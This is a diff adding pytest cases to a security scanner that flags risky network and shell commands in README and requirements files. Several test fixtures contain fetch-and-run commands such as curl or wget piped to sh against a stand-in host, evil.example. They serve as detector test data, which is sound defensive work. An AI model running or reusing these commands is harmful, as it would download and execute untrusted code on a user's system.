@@ -87,6 +87,14 @@ def test_text_scanner_routes_localized_readme_through_security_detectors(tmp_pat
     )
 
 
+@pytest.mark.parametrize("filename", ["README.md.bak", "README.png"])
+def test_text_scanner_does_not_claim_readme_near_matches(tmp_path: Path, filename: str) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    assert not TextScanner.can_handle(str(text_path))
+
+
 def test_text_scanner_does_not_claim_arbitrary_extensionless_text(tmp_path: Path) -> None:
     text_path = tmp_path / "notes"
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
@@ -454,6 +462,9 @@ def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(
     "content",
     [
         'sh -c "$(curl https://evil.example/payload)"\n',
+        'sh -c "sudo curl https://evil.example/payload | sh"\n',
+        'bash -c "sudo -u nobody HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload"\n',
+        'echo ready; sh -c "sudo curl https://evil.example/payload | sh"\n',
         "$(wget https://evil.example/payload)\n",
         "`curl https://evil.example/payload`\n",
         'echo "$(curl https://evil.example/payload)"\n',
@@ -471,6 +482,20 @@ def test_text_scanner_documentation_shell_substitution_remains_actionable(
 
     assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Use sh -c with sudo and curl when appropriate; see https://docs.example.com/shell.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
@@ -1064,6 +1089,8 @@ def test_text_scanner_standard_requirements_urls_are_informational(
     [
         "# --index-url https://pypi.org/simple",
         "# --index-url http://pypi.org/simple",
+        "# --index-url https://pypi.org:bad/simple",
+        "# --index-url https://pypi.org:70000/simple",
     ],
 )
 def test_text_scanner_commented_requirements_url_is_informational(
